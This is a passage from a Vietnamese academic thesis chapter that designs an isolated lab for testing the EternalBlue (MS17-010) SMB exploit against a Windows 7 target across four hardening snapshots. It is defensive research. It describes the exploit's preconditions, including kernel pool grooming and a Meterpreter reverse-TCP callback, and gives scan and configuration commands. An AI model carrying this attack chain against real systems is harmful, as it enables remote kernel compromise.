# CHƯƠNG 2. THIẾT KẾ VÀ TRIỂN KHAI MÔ HÌNH THỰC NGHIỆM

Sau khi đã hệ thống hóa cơ sở lý thuyết về giao thức SMB, cơ chế lỗ hổng MS17-010 và các công cụ phục vụ kiểm thử ở Chương 1, Chương 2 thiết lập phương pháp luận và môi trường thực nghiệm có kiểm soát. Chương này từ bỏ cách tiếp cận khảo sát dạng hộp đen (Black-box) để chuyển dịch sang **mô hình nghiên cứu chuỗi nhân quả (Causal-Chain Research Model)**. Toàn bộ kiến trúc mạng, máy trạng thái của đối tượng kiểm thử và các kỹ thuật đo lường được thiết kế nhằm xác định chính xác các tiền điều kiện kỹ thuật của đường tấn công, đo lường các điểm bẻ gãy phòng thủ (Defense Breakpoints) và kiểm chứng tính khả dụng của dịch vụ nghiệp vụ trong môi trường mạng phân đoạn doanh nghiệp mô phỏng.

---

## 2.1. YÊU CẦU VÀ NGUYÊN TẮC THIẾT KẾ MÔ HÌNH THỰC NGHIỆM

### 2.1.1. Nguyên tắc đạo đức nghề nghiệp và phạm vi kiểm thử được ủy quyền

Kiểm thử an ninh mạng (Penetration Testing) là hoạt động đánh giá an toàn thông tin can thiệp trực tiếp vào bề mặt dịch vụ và cơ chế quản lý bộ nhớ của hệ thống. Do đó, việc thiết kế và vận hành mô hình thực nghiệm phải tuân thủ nghiêm ngặt các chuẩn mực đạo đức nghề nghiệp và ranh giới pháp lý xác định [1]:

1. **Giới hạn phạm vi ủy quyền (Scope of Authorization):**
   Mọi thao tác khảo sát, quét cổng, gửi bản tin thăm dò và xác minh an ninh chỉ được phép thực hiện trên các hệ thống máy ảo thuộc môi trường lab cô lập do nhóm nghiên cứu trực tiếp thiết lập, quản lý và sở hữu. Nghiêm cấm hoàn toàn việc hướng công cụ kiểm thử hoặc phát tán các gói tin thăm dò tới bất kỳ địa chỉ IP, dải mạng hoặc thiết bị nào nằm ngoài phạm vi phòng lab nội bộ của đề tài.

2. **Nguyên tắc không phá hoại và kiểm soát tác động:**
   Quá trình kiểm thử được thiết kế nhằm mục đích nhận diện và đánh giá rủi ro, không nhằm mục đích phá hoại tính sẵn sàng của hệ thống. Trong các pha kiểm thử có khả năng gây mất ổn định vùng nhớ nhân hệ điều hành, người kiểm thử phải áp dụng các tham số kiểm soát chặt chẽ, sử dụng payload an toàn và luôn có phương án phục hồi hệ thống tức thời [1].

3. **Bảo mật dữ liệu thực nghiệm:**
   Cấu hình kỹ thuật, mã định danh hệ thống và dữ liệu phát sinh trong quá trình thực nghiệm phải được lưu trữ trong môi trường nội bộ an toàn, phục vụ thuần túy cho mục đích nghiên cứu học thuật của đồ án, không chia sẻ công khai các thành phần có thể bị lạm dụng để tấn công phá hoại.

### 2.1.2. Yêu cầu về tính cô lập và kiểm soát rủi ro mạng

Do lỗ hổng MS17-010 (đặc biệt CVE-2017-0144) cho phép thực thi mã từ xa mức nhân và có khả năng tự động lan truyền dạng sâu (wormable), kiến trúc lab bắt buộc phải bảo đảm tính cô lập hoàn toàn [2]:
- **Ngăn chặn rò rỉ lưu lượng (Traffic Containment):** Mạng lab phải được ngắt kết nối hoàn toàn khỏi mạng cục bộ của cơ sở đào tạo và Internet công cộng. Các gói tin SMB (TCP 445 / 139) và bản tin khai thác không được phép định tuyến vượt ra ngoài thiết bị chuyển mạch ảo nội bộ.
- **Loại bỏ kết nối Internet thực:** Toàn bộ kết nối ngoại vi (nếu có) chỉ là mạng diện rộng mô phỏng (Simulated WAN) phục vụ kiểm thử định tuyến, không có kết nối vật lý hoặc logic ra Internet thật.
- **Kiểm soát gateway và DHCP:** Các máy trạm trong các phân vùng mạng chỉ trỏ Default Gateway về thiết bị tường lửa nội bộ (Firewall/UTM). Không sử dụng dịch vụ DHCP cấp phát tự động dùng chung với máy chủ vật lý nhằm tránh xung đột và kiểm soát chặt chẽ nguồn gốc lưu lượng mạng.

### 2.1.3. Phương pháp luận nghiên cứu chuỗi nhân quả (Causal-Chain Methodology)

Nghiên cứu từ bỏ cách tiếp cận đánh giá hộp đen vốn chỉ ghi nhận hiện tượng bề mặt ("khai thác thành công" hoặc "khai thác thất bại"). Thay vào đó, đường tấn công của CVE-2017-0144 / EternalBlue được mô hình hóa thành một chuỗi các tiền điều kiện logic có quan hệ nhân quả phụ thuộc tuần tự [1], [3]:

$$\text{Attack Path Success} \iff R \land S \land D \land V \land E \land (C \lor \neg \text{Reverse})$$

Trong đó, các biến tiền điều kiện được định nghĩa hình thức:
- **$R$ (Network Reachability):** Khả năng tiếp cận mạng. Gói tin IP từ trạm kiểm thử có thể định tuyến qua các vùng mạng và xuyên qua chính sách lọc gói của Firewall để đến được cổng dịch vụ của máy mục tiêu (TCP 445 / 139).
- **$S$ (Service Responsiveness):** Trạng thái hoạt động của dịch vụ. Tiến trình `LanmanServer` đang lắng nghe và phản hồi hợp lệ các bản tin bắt tay ba bước TCP bằng gói tin mang cờ `SYN-ACK`.
- **$D$ (Dialect Negotiation Compatibility):** Tính tương thích về phương ngữ giao thức. Máy chủ chấp nhận thiết lập phiên truyền thông sử dụng phương ngữ SMBv1 (`NT LM 0.12`) trong gói tin phản hồi `SMB_COM_NEGOTIATE`.
- **$V$ (Vulnerable Implementation State):** Tồn tại khiếm khuyết trong logic xử lý của hệ điều hành. Driver nhân `srv.sys` chưa được cập nhật bản vá an ninh, chứa lỗi tính toán sai lệch kích thước danh sách thuộc tính mở rộng (FEA) trong hàm `SrvOs2FeaListSizeToNt` [3], [4].
- **$E$ (Exploit Execution Success):** Quá trình bố trí bộ nhớ và chuyển hướng thực thi thành công. Thao tác sắp xếp Non-Paged Pool (Pool Grooming) hoàn tất, lỗi tràn bộ đệm ghi đè chính xác cấu trúc điều khiển mà không làm hỏng cấu trúc danh sách liên kết của pool hoặc gây lỗi dừng hệ thống (BSOD) [3], [5].
- **$C$ (Callback / Reverse Channel Establishment):** Khả năng thiết lập kênh liên lạc ngược. Payload thực thi trong không gian nhân khởi tạo thành công kết nối TCP ngược trở lại máy kiểm thử (khi sử dụng kiến trúc payload Reverse Connection) [5], [6].

*Nguyên lý bẻ gãy phòng thủ (Defense Breakpoint):* Một giải pháp phòng thủ chỉ được công nhận có hiệu lực khi và chỉ khi chứng minh được nó đã chuyển đổi ít nhất một tiền điều kiện cần thiết trong chuỗi từ giá trị $\text{True} \to \text{False}$. Không được kết luận một biện pháp phòng thủ thành công chỉ dựa trên hiện tượng exploit thất bại, bởi exploit thất bại có thể bắt nguồn từ sự mất ổn định của kernel pool thay vì hiệu lực của biện pháp bảo vệ.

---

## 2.2. THIẾT KẾ KIẾN TRÚC MẠNG LAB DOANH NGHIỆP MÔ PHỎNG

### 2.2.1. Cấu trúc mạng phân đoạn 3 VLAN

Mô hình thực nghiệm mô phỏng kiến trúc mạng phân đoạn tiêu chuẩn của doanh nghiệp, thay thế hoàn toàn cấu trúc mạng phẳng (Flat Network) đơn giản. Kiến trúc bao gồm một thiết bị Tường lửa/UTM ảo làm trung tâm điều phối, kết nối xuống thiết bị chuyển mạch Core Switch Layer 2 và phân tách thành ba mạng ảo (VLAN) độc lập [2]:

1. **VLAN 10 – Server Subnet (`192.168.10.0/24`):**
   Phân vùng máy chủ nội bộ. Chứa máy chủ mục tiêu Windows 7 SP1 x64 đóng vai trò máy chủ chia sẻ tệp SMB (`192.168.10.20`).
2. **VLAN 20 – Pentest Subnet (`192.168.20.0/24`):**
   Phân vùng dành riêng cho trạm kiểm thử an ninh. Chứa máy kiểm thử Kali Linux (`192.168.20.10`), mô phỏng vị trí của một máy trạm bị thỏa hiệp hoặc phân vùng kiểm thử chuyên trách.
3. **VLAN 30 – User Subnet (`192.168.30.0/24`):**
   Phân vùng người dùng văn phòng hợp lệ. Chứa máy trạm Windows Client (`192.168.30.50`), đóng vai trò là trạm đối chứng nghiệp vụ dương tính (Positive Business Control).

### 2.2.2. Nguyên lý Inter-VLAN Routing và Firewall Inspection

Cơ chế định tuyến và kiểm soát lưu lượng được thiết kế theo các nguyên tắc mạng doanh nghiệp nghiêm ngặt [2]:
- **Firewall là điểm định tuyến duy nhất (Single Routing Point):** Thiết bị Tường lửa/UTM (sử dụng pfSense, OPNsense hoặc VyOS) đóng vai trò là Default Gateway của cả ba VLAN (`192.168.10.1`, `192.168.20.1`, `192.168.30.1`). Mọi lưu lượng truyền thông giữa các VLAN (Inter-VLAN traffic) bắt buộc phải đi qua tường lửa để kiểm tra chính sách (Stateful Inspection) và ghi nhận nhật ký (Firewall Logging).
- **Chính sách kiểm soát phiên hai chiều (Stateful Inspection & Reverse Channel Policy):** 
  - *Chiều Inbound (VLAN 20 $\to$ VLAN 10):* Tại các trạng thái $S_0, S_1, S_2$, Firewall cho phép lưu lượng TCP tới cổng 139 và 445 của máy chủ mục tiêu. Tại trạng thái $S_3$, quy tắc này chuyển sang chế độ từ chối và ghi nhật ký (`Block & Log`), bẻ gãy tiền điều kiện $R$ ngay tại cửa ngõ vào.
  - *Chiều Outbound / Egress (VLAN 10 $\to$ VLAN 20):* Do payload khai thác Meterpreter sử dụng kiến trúc kết nối ngược (`reverse_tcp`), máy mục tiêu sau khi bị chèn shellcode sẽ chủ động khởi tạo phiên TCP ra ngoài hướng về trạm kiểm thử (`192.168.20.10:4444`). Tại $S_0, S_1, S_2$, Firewall được cấu hình chính sách cho phép lưu lượng thử nghiệm có kiểm soát từ VLAN 10 sang cổng 4444 của VLAN 20 nhằm đo lường khả năng thiết lập kênh liên lạc ngược ($C$). Khi bước sang trạng thái $S_3$, do gói tin tấn công ban đầu bị chặn ngay tại chiều vào ($R = \text{False}$), mã độc không được kích hoạt trên máy chủ, dẫn đến kênh kết nối ngược $C$ tự động bị vô hiệu hóa từ gốc rễ.
- **Core Switch thuần Layer 2:** Thiết bị chuyển mạch Core Switch chỉ thực hiện chức năng chuyển mạch và truyền tải các đường trung kế (802.1Q Trunking), hoàn toàn không bật tính năng định tuyến IP (Layer 3 Switching bị tắt). Điều này ngăn chặn việc các gói tin đi tắt qua switch mà bỏ qua tường lửa.
- **Không kết nối Internet thật:** Phía ngoài tường lửa được kết nối tới một mạng diện rộng mô phỏng (Simulated WAN: `172.16.0.0/24`) phục vụ kiểm thử các kịch bản định tuyến biên, hoàn toàn cách ly với card mạng vật lý của máy chủ chủ quản.

### 2.2.3. Sơ đồ Topo mạng kiến trúc doanh nghiệp mô phỏng

Sơ đồ 2.1 mô tả chi tiết kiến trúc kết nối và phân bổ phân vùng mạng trong môi trường thực nghiệm:

```
+-------------------------------------------------------------------------+
|                  MẠNG DOANH NGHIỆP MÔ PHỎNG (ENTERPRISE LAB)            |
|                                                                         |
|  [SIMULATED WAN: 172.16.0.0/24] (Cô lập hoàn toàn, không Internet thật) |
|                                 |                                       |
|                                 v (WAN Interface: 172.16.0.2)           |
|  +-------------------------------------------------------------------+  |
|  |                 FIREWALL / UTM APPLIANCE (pfSense / VyOS)         |  |
|  |   - Điểm duy nhất thực hiện Inter-VLAN Routing                    |  |
|  |   - Default Gateway: .10.1 (VLAN 10), .20.1 (VLAN 20), .30.1 (VLAN30)|
|  |   - Điểm thực thi chính sách lọc gói & Stateful Inspection        |  |
|  +-----------------------------------+-------------------------------+  |
|                                      |                                  |
|                                      | Trunk 802.1Q (VLAN 10, 20, 30)   |
|                                      v                                  |
|  +-------------------------------------------------------------------+  |
|  |               CORE SWITCH LAYER 2 (802.1Q Switching Only)         |  |
|  |               (Không định tuyến L3, chỉ trunking và access)       |  |
|  +-------------------+---------------+-------------------------------+  |
|                      |               |               |                  |
|        Access VLAN 10|  Access VLAN 20|  Access VLAN 30|                 |
|                      v               v               v                  |
|             +----------------+ +---------------+ +------------------+   |
|             | SERVER SUBNET  | |PENTEST SUBNET | | USER SUBNET      |   |
|             | VLAN 10        | | VLAN 20       | | VLAN 30          |   |
|             | 192.168.10.0/24| |192.168.20.0/24| | 192.168.30.0/24  |   |
|             +----------------+ +---------------+ +------------------+   |
|                      |                 |                 |              |
|                      v                 v                 v              |
|             +----------------+ +---------------+ +------------------+   |
|             | Target-Win7    | | Attacker-Kali | | Client-WinUser   |   |
|             | 192.168.10.20  | | 192.168.20.10 | | 192.168.30.50    |   |
|             | Target 4-State | | Trạm kiểm thử | | Trạm đối chứng   |   |
|             | (S0->S1->S2->S3| | Nmap/NSE/MSF  | | nghiệp vụ hợp lệ |   |
|             +----------------+ +---------------+ +------------------+   |
|                                                                         |
+-------------------------------------------------------------------------+
```
*Sơ đồ 2.1: Sơ đồ topo mạng phân đoạn doanh nghiệp mô phỏng (Enterprise Network Topology)*

### 2.2.4. Phân bổ không gian địa chỉ IP và thông số kỹ thuật

Ma trận thông số mạng, phân bổ địa chỉ IP và cấu hình giao diện mạng được chuẩn hóa tại Bảng 2.1:

*Bảng 2.1: Ma trận phân bổ địa chỉ IP, VLAN và thông số kỹ thuật các nút mạng*

| Tên nút mạng | Phân vùng mạng | VLAN ID | Địa chỉ IP / Subnet | Default Gateway | Dịch vụ lắng nghe chính | Vai trò nghiên cứu |
|---|---|:---:|---|---|---|---|
| **Firewall/UTM** | Định tuyến biên | 10, 20, 30 | `192.168.10.1`, `20.1`, `30.1` | Không có (Root GW) | Lọc gói, ghi nhật ký, Inter-VLAN routing | Điểm kiểm soát chính sách và bẻ gãy tiền điều kiện $R$ |
| **Attacker-Kali** | Pentest Subnet | 20 | `192.168.20.10/24` | `192.168.20.1` | Không mở dịch vụ inbound | Trạm phát sinh lưu lượng kiểm thử (Nmap, Metasploit) |
| **Target-Win7** | Server Subnet | 10 | `192.168.10.20/24` | `192.168.10.1` | TCP 445 (`microsoft-ds`), TCP 139 (`netbios-ssn`) | Đối tượng kiểm thử đơn biến qua 4 trạng thái snapshot |
| **Client-WinUser**| User Subnet | 30 | `192.168.30.50/24` | `192.168.30.1` | Client SMB Workstation | Đối chứng nghiệp vụ dương tính (Positive Business Control) |

---

## 2.3. MÔ HÌNH MÁY TRẠNG THÁI ĐƠN BIẾN (SINGLE-VARIABLE CAUSAL STATE MACHINE)

### 2.3.1. Thiết kế chuỗi 4 trạng thái Snapshot trên cùng một hệ thống mục tiêu

Một thiếu sót phổ biến trong các nghiên cứu kiểm thử là triển khai đồng thời hai hoặc nhiều máy ảo khác nhau (ví dụ: máy A chưa vá nhưng bật SMBv1, máy B vừa cài vá vừa tắt SMBv1 vừa chặn tường lửa). Thiết kế này vi phạm nguyên tắc kiểm soát biến số, khiến kết quả không thể xác định được nguyên nhân cốt lõi làm thất bại cuộc tấn công bắt nguồn từ bản vá, từ việc tắt giao thức hay do tường lửa ngăn chặn. Mặt khác, việc khảo sát toàn bộ không gian tổ hợp $2^3 = 8$ trạng thái toán học là không cần thiết và thiếu tính thực tiễn trong quản trị an ninh thông tin.

Để thiết lập quan hệ nhân quả chuẩn mực, đề tài sử dụng **duy nhất một máy ảo mục tiêu Windows 7 SP1 x64** (`192.168.10.20`) vận hành tuần tự qua **chuỗi 4 trạng thái Snapshot đơn biến** ($S_0 \to S_1 \to S_2 \to S_3$). Thiết kế chuỗi tiến trình này dựa trên hai cơ sở học thuật chặt chẽ:
- *Vòng đời tăng cường an ninh thực tế (Hardening Lifecycle):* Chuỗi 4 trạng thái mô phỏng chính xác lộ trình phòng thủ chiều sâu (Defense-in-Depth) trong doanh nghiệp: (1) Khắc phục lỗ hổng cốt lõi bằng bản vá của nhà sản xuất ($S_0 \to S_1$); (2) Thu hẹp bề mặt tấn công qua loại bỏ giao thức cũ ($S_1 \to S_2$); (3) Thiết lập hàng rào ngăn cách phân đoạn mạng vật lý/logic ($S_2 \to S_3$).
- *Tính chất kiểm soát đơn biến nghiêm ngặt:* Tại mỗi bước chuyển trạng thái $S_i \to S_{i+1}$, chỉ có đúng một biến can thiệp độc lập được điều chỉnh, trong khi toàn bộ phần cứng ảo, hệ thống tệp và cấu hình hệ điều hành được bảo toàn nguyên vẹn nhờ cơ chế snapshot. Điều này giúp loại trừ các trạng thái tổ hợp phi thực tế trong vận hành (chẳng hạn trạng thái đã chặn mạng nhưng cố tình gỡ bản vá), đồng thời bảo đảm tính xác định đơn trị của nguyên nhân bẻ gãy đường tấn công.

Bốn trạng thái snapshot được định nghĩa cụ thể:

1. **Trạng thái $S_0$ – Vulnerable Baseline (Trạng thái gốc tồn tại lỗ hổng):**
   - *Cấu hình:* Windows 7 SP1 x64 nguyên bản (Build 7601), chưa cài đặt gói KB4012212; tính năng SMBv1 được kích hoạt mặc định; Firewall nội bộ cho phép lưu lượng TCP 445/139 từ VLAN 20 và VLAN 30; dịch vụ `LanmanServer` hoạt động bình thường [4], [7].
   - *Giá trị tiền điều kiện:* $R = \text{True}, S = \text{True}, D = \text{True}, V = \text{True}, E = ?, C = ?$.
   - *Ý nghĩa:* Xác lập điểm chuẩn ban đầu (baseline), kiểm chứng khả năng phát hiện ở cả 4 cấp độ.

2. **Trạng thái $S_1$ – Patch Only (Chỉ áp dụng bản vá an ninh):**
   - *Biến thay đổi duy nhất:* Cài đặt bản cập nhật an ninh chính thức `Windows6.1-KB4012212-x64.msu` [4]. Giữ nguyên tính năng SMBv1 đang bật và giữ nguyên chính sách mạng cho phép truy cập cổng 445.
   - *Giá trị tiền điều kiện:* $R = \text{True}, S = \text{True}, D = \text{True}, \mathbf{V = \text{False}}, E = \text{False}, C = \text{False}$.
   - *Ý nghĩa:* Chứng minh việc cập nhật bản vá khắc phục khiếm khuyết trong driver `srv.sys` (bẻ gãy $V$), trong khi khả năng tiếp cận mạng ($R$), dịch vụ ($S$) và đàm phán SMBv1 ($D$) vẫn tồn tại nguyên vẹn.

3. **Trạng thái $S_2$ – SMBv1 Disabled (Vô hiệu hóa giao thức SMBv1):**
   - *Biến thay đổi duy nhất:* Giữ nguyên bản vá của $S_1$, thực thi vô hiệu hóa máy chủ SMBv1 thông qua cấu hình Registry theo tài liệu Microsoft Learn [7]:
     ```cmd
     reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v SMB1 /t REG_DWORD /d 0 /f
     ```
   - *Giá trị tiền điều kiện:* $R = \text{True}, S = \text{True}, \mathbf{D = \text{False}}, V = \text{False}, E = \text{False}, C = \text{False}$.
   - *Ý nghĩa:* Chứng minh việc tắt SMBv1 loại bỏ khả năng đàm phán phương ngữ cũ ($D = \text{False}$), trong khi cổng TCP 445 vẫn mở và dịch vụ chia sẻ tệp qua SMBv2 vẫn duy trì hoạt động ($R = \text{True}, S = \text{True}$).

4. **Trạng thái $S_3$ – Firewall / Segmentation Hardened (Gia cố phân đoạn mạng bằng Tường lửa):**
   - *Biến thay đổi duy nhất:* Giữ nguyên trạng thái $S_2$, thiết lập chính sách lọc gói trên Firewall/UTM chặn toàn bộ lưu lượng TCP 445 và 139 khởi tạo từ VLAN 20 (Pentest) đi sang VLAN 10 (Server); đồng thời duy trì chính sách cho phép lưu lượng TCP 445 từ VLAN 30 (User) đi sang VLAN 10.
   - *Giá trị tiền điều kiện (từ góc độ Pentester):* $\mathbf{R = \text{False}}, S = \text{False}, D = \text{False}, V = \text{False}, E = \text{False}, C = \text{False}$.
   - *Ý nghĩa:* Chứng minh phân đoạn mạng ngăn chặn khả năng tiếp cận của kẻ tấn công ($R = \text{False}$) từ các phân vùng mạng không tin cậy.

### 2.3.2. Vai trò đối chứng nghiệp vụ dương tính của trạm Client tại VLAN 30

Một lỗ hổng lớn trong các mô hình kiểm thử an toàn là chỉ tập trung vào việc ngăn chặn tấn công mà bỏ qua tính sẵn sàng của nghiệp vụ (Business Availability). Một biện pháp phòng thủ làm sập hoặc làm gián đoạn việc chia sẻ tệp của người dùng hợp lệ không thể được coi là giải pháp an toàn thành công.

Để giải quyết vấn đề này, máy trạm `Client-WinUser` tại VLAN 30 (`192.168.30.50`) đóng vai trò là **trạm đối chứng nghiệp vụ dương tính (Positive Business Control)**. Tại mỗi trạng thái snapshot từ $S_0$ đến $S_3$, sau khi trạm Kali Linux hoàn tất các kịch bản kiểm thử, trạm Client thực hiện các thao tác truy cập nghiệp vụ chuẩn mực:
1. Thực hiện lệnh gắn kết tài nguyên chia sẻ qua giao thức SMB:
   ```cmd
   net use Z: \\192.168.10.20\ShareData /user:labuser Password123!
   ```
2. Thực hiện đọc, ghi một tệp tin dữ liệu thử nghiệm và xác nhận phiên truyền thông sử dụng phương ngữ SMBv2 thông qua lệnh PowerShell:
   ```powershell
   Get-SmbConnection | Select-Object ServerName, Dialect, NumOpens
   ```

*Bảng 2.2: Ma trận phân tích chuỗi nhân quả qua 4 trạng thái Snapshot đơn biến*

| Trạng thái | Biến can thiệp đơn biến | $R$ | $S$ | $D$ | $V$ | $E$ | $C$ | Trạng thái nghiệp vụ VLAN 30 | Kết luận khoa học |
|:---:|---|:---:|:---:|:---:|:---:|:---:|:---:|---|---|
| **$S_0$** | Baseline gốc (Chưa can thiệp) | True | True | True | True | True* | True* | Kết nối thành công (SMBv1 / SMBv2) | Điểm chuẩn lỗ hổng ban đầu |
| **$S_1$** | Cài đặt bản vá KB4012212 | True | True | True | **False** | False | False | Kết nối thành công (SMBv2) | Bản vá bẻ gãy $V$; $R, S, D$ vẫn mở |
| **$S_2$** | Vô hiệu hóa SMBv1 (`SMB1 = 0`) | True | True | **False**| False | False | False | Kết nối thành công (SMBv2) | Tắt SMBv1 bẻ gãy $D$; duy trì SMBv2 |
| **$S_3$** | Chặn Firewall VLAN 20 $\to$ 10 | **False**| False| False| False | False | False | Kết nối thành công (SMBv2 thông suốt)| Firewall bẻ gãy $R$ từ Pentest; nghiệp vụ toàn vẹn |

*(Ghi chú 1: Giá trị $E$ và $C$ tại trạng thái $S_0$ phụ thuộc vào việc kiểm soát hiện tượng phân mảnh bộ nhớ kernel pool; xem Mục 2.4.5).*  
*(Ghi chú 2 - Phân biệt góc nhìn quan sát tại trạng thái $S_3$: Bảng 2.2 phản ánh chuỗi tiền điều kiện **từ góc độ trạm kiểm thử (Attacker Vantage Point - VLAN 20)**. Khi Firewall chặn lưu lượng từ VLAN 20, $R = \text{False}$ khiến các giai đoạn tiếp theo $(S, D, V, E, C)$ không thể kích hoạt từ xa. Tuy nhiên, xét về **trạng thái nội tại của máy chủ (Server Internal State)** trên VLAN 10, dịch vụ `LanmanServer` vẫn đang chạy bình thường trên cổng 445; giao thức SMBv2 vẫn hoạt động ổn định và sẵn sàng phục vụ người dùng hợp lệ từ VLAN 30 ($S_{\text{internal}} = \text{True}, D_{\text{v2}} = \text{True}$)).*

### 2.3.3. Phương pháp luận chứng minh tính bất khả thi của đường tấn công (Proof of Attack Impossibility)

Khác biệt cốt lõi giữa tiếp cận thực nghiệm khoa học và khảo sát dạng hộp đen (Black-box) nằm ở khả năng **chứng minh bản chất của tính bất khả thi**. Trong nghiên cứu hộp đen, người thực hiện chỉ chạy công cụ khai thác (ví dụ Metasploit `exploit`), thấy không mở được session thì kết luận "hệ thống an toàn". Kết luận này hoàn toàn thiếu căn cứ học thuật, bởi sự thất bại của exploit có thể do cấu hình sai payload, sai port, mạng nghẽn, lỗi phân mảnh bộ nhớ ngẫu nhiên hoặc máy chủ bị treo ngầm.

Mô hình nghiên cứu chuỗi nhân quả của đề tài giải quyết triệt để hạn chế này bằng cách chứng minh tính bất khả thi thông qua logic suy diễn hình thức kết hợp với đo lường thực nghiệm bạch hộp tại từng tầng công nghệ:

1. **Cơ sở logic hình thức của tính bất khả thi:**
   Đường tấn công chỉ có thể dẫn tới kiểm soát hệ thống khi và chỉ khi toàn bộ chuỗi tiền điều kiện đồng thời thỏa mãn:
   $$\text{Attack Feasibility} \iff R \land S \land D \land V \land E \land (C \lor \neg \text{Reverse})$$
   Theo quy tắc tuyển - hội logic toán học, một cuộc tấn công được chứng minh là **BẤT KHẢ THI (IMPOSSIBLE)** khi và chỉ khi chứng minh được tồn tại ít nhất một tiền điều kiện $P_i \in \{R, S, D, V, E, C\}$ nhận giá trị xác định bằng $\text{False}$ ($0$):
   $$(\exists P_i = 0) \implies \prod_{k} P_k = 0 \implies \text{Attack Path} \equiv \text{Impossible}$$
   Năm kỹ thuật đo lường được thiết kế chính là các công cụ kiểm chứng để xác thực giá trị chân lý của từng biến tiền điều kiện $P_i$ tại từng trạng thái phòng thủ cụ thể.

2. **Cơ chế chứng minh bất khả thi tại từng tầng công nghệ:**
   - **Chứng minh bất khả thi ở tầng Nhân hệ điều hành (Kernel Level) tại trạng thái $S_1$:**
     - *Bản chất can thiệp:* Bản vá KB4012212 can thiệp trực tiếp vào mã máy của driver `srv.sys`, bổ sung đoạn mã kiểm tra toán học biên bộ đệm trong hàm `SrvOs2FeaListSizeToNt` [3], [4]. Khi client gửi danh sách thuộc tính mở rộng (FEA), driver xác thực tổng kích thước thực tế và kiểm tra tràn số nguyên. Nếu sai lệch, hàm trả về mã lỗi và hủy bỏ xử lý trước khi thực hiện cấp phát bộ nhớ Non-Paged Pool nhỏ và sao chép bộ đệm.
     - *Bằng chứng đo lường:* Kỹ thuật 3 (`smb-vuln-ms17-010.nse`) gửi bản tin `PeekNamedPipe` với `MaxDataCount = 0xFFFF`. Phản hồi trả về đổi từ `STATUS_INSUFF_SERVER_RESOURCES` (`0xC0000205`) sang `STATUS_ACCESS_DENIED` (`0xC0000022`) / `STATUS_INVALID_HANDLE` (`0xC0000008`) [8], [9]. Kỹ thuật 4 độc lập xác nhận `Host does NOT appear vulnerable` [5]. Khi chạy Kỹ thuật 5, do driver không sao chép dữ liệu vượt biên, Non-Paged Pool hoàn toàn không bị ghi đè, không có con trỏ hàm nào bị chuyển hướng sang shellcode $\implies V = \text{False} \implies$ Cuộc tấn công bị triệt tiêu từ bản chất logic nhân hệ điều hành.
   - **Chứng minh bất khả thi ở tầng Giao thức (Protocol / Dialect Level) tại trạng thái $S_2$:**
     - *Bản chất can thiệp:* Cấu hình Registry `SMB1 = 0` loại bỏ hoàn toàn trình điều phối phương ngữ SMBv1 trong dịch vụ `LanmanServer` [7].
     - *Bằng chứng đo lường:* Kỹ thuật 2 (`smb-protocols`) gửi bản tin `SMB_COM_NEGOTIATE` chứa danh sách chuỗi phương ngữ. Gói tin phản hồi từ máy chủ hoàn toàn loại bỏ chuỗi `NT LM 0.12`, chỉ chấp nhận phương ngữ từ `SMB 2.0.2` trở lên (hoặc ngắt kết nối nếu chỉ gửi SMBv1) [6], [9]. Do Kỹ thuật 3 và Kỹ thuật 5 phụ thuộc vào khung bản tin SMBv1 (`SMB_COM_TRANSACTION` opcode `0x25`), khi tầng đàm phán giao thức bị từ chối, phiên SMBv1 không thể thiết lập. Kẻ tấn công không thể gửi bất kỳ payload hay bản tin khai thác nào vào hệ thống $\implies D = \text{False} \implies$ Cuộc tấn công bất khả thi vì giao thức cần thiết đã bị loại bỏ khỏi bề mặt dịch vụ.
   - **Chứng minh bất khả thi ở tầng Phân đoạn mạng (Network Segmentation Level) tại trạng thái $S_3$:**
     - *Bản chất can thiệp:* Tường lửa/UTM áp dụng quy tắc lọc gói Stateful Inspection tại cổng vào (Ingress) của VLAN 20, loại bỏ (Drop) toàn bộ gói tin TCP hướng tới cổng 445/139 của VLAN 10 [2].
     - *Bằng chứng đo lường:* Quy trình kiểm chứng PCAP 3 điểm xác nhận: (a) Kali Linux gửi gói TCP SYN; (b) Tường lửa ghi nhận bản ghi nhật ký Drop; (c) Card mạng máy chủ hoàn toàn không nhận được bất kỳ gói TCP SYN nào từ Kali. Kỹ thuật 1 xác nhận cổng ở trạng thái `filtered` [8]. Do không có gói tin nào tiếp cận máy chủ, quá trình bắt tay 3 bước TCP không thể khởi tạo $\implies R = \text{False}$. Do $R = \text{False}$, toàn bộ chuỗi $S, D, V, E, C$ bị ngắt mạch ngay từ tầng mạng. Cuộc tấn công bất khả thi ở tầng mạng vật lý/logic.

3. **Nguyên lý chứng minh đối chứng kép (Dual Verification with Business Availability):**
   Một giải pháp an toàn chỉ được công nhận là phòng thủ hiệu quả khi tính bất khả thi của cuộc tấn công không đánh đổi bằng việc làm sập hệ thống (Denial of Service). Thông qua trạm Client tại VLAN 30 (`192.168.30.50`), nghiên cứu chứng minh: ở cả ba trạng thái phòng thủ $S_1, S_2, S_3$, người dùng hợp lệ vẫn kết nối chia sẻ tệp thành công qua SMBv2, đọc/ghi dữ liệu thông suốt. Đây là bằng chứng khoa học khẳng định: **Dịch vụ vẫn tồn tại và phục vụ người dùng hợp lệ, nhưng cuộc tấn công từ phân vùng kiểm thử là BẤT KHẢ THI vì các tiền điều kiện kỹ thuật đã bị bẻ gãy một cách có đo lường và có thể kiểm chứng độc lập ở từng tầng công nghệ.**

---

## 2.4. PHƯƠNG PHÁP LUẬN VÀ CHUẨN HÓA KỸ THUẬT THEO MÔ HÌNH BẠCH HỘP

Mọi kỹ thuật kiểm thử trong Chương 2 được thiết kế theo cấu trúc chuẩn mực 10 thành phần kỹ thuật, bảo đảm người nghiên cứu nắm bắt chính xác cơ chế tác động nội tại lên giao thức và hệ điều hành:

### 2.4.1. Kỹ thuật 1: Khảo sát tiếp cận và nhận diện dịch vụ (TCP SYN Scan & Service Detection)

1. **Input:** Lệnh `nmap -sS -sV -p 139,445 -n -Pn --reason 192.168.10.20`.
2. **Preconditions:** Tiền điều kiện $R = \text{True}$ (tuyến đường mạng thông suốt, không bị chặn bởi tường lửa).
3. **Internal Mechanism:** Nmap phát sinh gói tin TCP mang cờ SYN tới cổng 445 và 139. Trình điều khiển TCP/IP của máy đích phản hồi gói tin TCP mang cờ SYN-ACK. Nmap ghi nhận cổng ở trạng thái `open` và gửi ngay gói tin TCP RST để giải phóng phiên kết nối mà không hoàn tất bắt tay ba bước. Tiếp đó, Nmap gửi chuỗi đầu dò ứng dụng (Service Probes) để thu thập banner và định danh dịch vụ `microsoft-ds` [6], [8].
